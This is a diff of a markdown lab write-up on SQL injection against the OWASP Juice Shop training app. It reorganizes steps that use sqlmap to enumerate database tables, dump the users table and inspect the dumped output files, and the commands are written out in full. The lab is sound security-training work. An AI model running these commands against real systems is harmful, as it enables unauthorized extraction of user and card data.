@@ -20,7 +20,7 @@ sqlmap -r owasp.txt --dbs
 
 ---
 
-## Step 2 – Identifying Database Name
+## Step 2 – Identifying Database Name and  Enumerating Database Tables
 
 ### Command Used
 ```bash
@@ -28,22 +28,12 @@ sqlmap -r owasp.txt -D SQLite_masterdb --tables --level=3 --risk=2
 ```
 
 - Enumerated tables from the `SQLite_masterdb` database to understand the application's internal database structure.
-- SQLMap Trying to discovered tables.
+- SQLMap successfully discovered tables such as `users`, `products`, `cards`, and `addresses`
+.
 <img width="1341" height="503" alt="TASK3-S1" src="https://github.com/user-attachments/assets/36fffbc8-bd28-40d0-9528-c6167d4fce0b" />
+<img width="1344" height="495" alt="TASK3-S2" src="https://github.com/user-attachments/assets/9322b66f-697c-4d6c-b476-949b91d228ea" />
 
 ---
-
-## Step 3 – Enumerating Database Tables and dumping data from user table
-
-### Command Used
-```bash
-sqlmap -r owasp.txt -D SQLite_masterdb -T users --dump --level=3 --risk=2
-```
-
-- Attempted to dump records from the `users` table to retrieve stored user information from the vulnerable application.
-- SQLMap successfully discovered tables such as `users`, `products`, `cards`, and `addresses`
-- SQLMap stored the extracted session data, logs, and dumped content inside the local SQLMap output directory for further analysis.
-<img width="1344" height="495" alt="TASK3-S2" src="https://github.com/user-attachments/assets/9322b66f-697c-4d6c-b476-949b91d228ea" />
 
 ---
 
@@ -51,11 +41,13 @@ sqlmap -r owasp.txt -D SQLite_masterdb -T users --dump --level=3 --risk=2
 
 ### Commands Used
 ```bash
+sqlmap -r owasp.txt -D SQLite_masterdb -T users --dump --level=3 --risk=2
 cd /root/.local/share/sqlmap/output/juice-shop.herokuapp.com
 ls -l
 ls -R
 ```
-
+- Attempted to dump records from the `users` table to retrieve stored user information from the vulnerable application.
+- SQLMap stored the extracted session data, logs, and dumped content inside the local SQLMap output directory for further analysis.
 - Navigated to the SQLMap output directory to inspect generated logs, session files, and dumped database content.
 - Verified that SQLMap created files such as `session.sqlite`, `target.txt`, and dump directories containing extracted data.
 
